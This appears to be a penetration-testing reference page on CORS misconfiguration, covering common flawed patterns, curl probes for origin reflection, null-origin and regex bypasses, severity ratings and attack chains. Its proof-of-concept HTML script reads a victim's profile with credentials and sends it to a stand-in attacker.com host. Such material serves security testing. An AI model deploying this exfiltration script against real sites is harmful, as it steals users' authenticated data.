# CORS Misconfiguration

## What it is

Cross-Origin Resource Sharing headers configured to allow unauthorized
origins to read responses from the target, bypassing the Same-Origin
Policy. Enables cross-origin data theft from authenticated sessions.

**CWE**: CWE-942 (Overly Permissive Cross-domain Whitelist)

## Common patterns

- `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`
  (browsers reject this combo, but indicates broken logic)
- Origin reflection: server echoes whatever `Origin` header is sent
- Null origin allowed: `Access-Control-Allow-Origin: null` (exploitable via
  sandboxed iframes, data: URIs)
- Subdomain wildcard trust: `*.example.com` trusts all subdomains (XSS on
  any subdomain → full CORS bypass)
- Regex bypass: `^https://example\.com` matches `https://example.com.evil.com`
- Preflight bypass: simple requests (GET with standard headers) skip OPTIONS

## Exploitation

```bash
# Check origin reflection
curl -sI "$TARGET/api/user/profile" \
  -H "Origin: https://evil.com" | grep -i "access-control"

# Check null origin
curl -sI "$TARGET/api/user/profile" \
  -H "Origin: null" | grep -i "access-control"

# Check subdomain trust
curl -sI "$TARGET/api/user/profile" \
  -H "Origin: https://subdomain.target.com" | grep -i "access-control"

# Check regex bypass
curl -sI "$TARGET/api/user/profile" \
  -H "Origin: https://target.com.evil.com" | grep -i "access-control"

# Full PoC (HTML page on attacker domain)
cat <<'HTML'
<script>
fetch('https://target.com/api/user/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // data contains victim's profile
  fetch('https://attacker.com/log?d=' + btoa(JSON.stringify(data)));
});
</script>
HTML
```

## Evidence requirements

- **Demonstrated**: response includes `Access-Control-Allow-Origin: https://evil.com`
  AND `Access-Control-Allow-Credentials: true` (or equivalent), AND the
  endpoint returns sensitive data (PII, tokens, account info)
- **Inferred**: origin reflection confirmed but endpoint returns non-sensitive data
- PoC HTML page showing cross-origin data extraction preferred

## Severity

| Variant | Severity | Condition |
|---|---|---|
| Origin reflection + credentials + sensitive data | High | Full cross-origin theft |
| Null origin allowed + credentials + sensitive data | High | Exploitable via sandbox |
| Wildcard (`*`) without credentials | Informational | Browsers block credentials |
| Origin reflection on non-sensitive endpoint | Low | No data to steal |
| Subdomain trust (no XSS on subdomains) | Low | Requires subdomain compromise |
| Subdomain trust + XSS on any subdomain | High | Chain to full bypass |

## Chains

- CORS misconfiguration + authenticated endpoint → cross-origin data theft
- CORS + XSS on trusted subdomain → bypass restricted whitelist
- CORS → session token exposure → account takeover
- CORS on admin API → admin action execution from attacker page
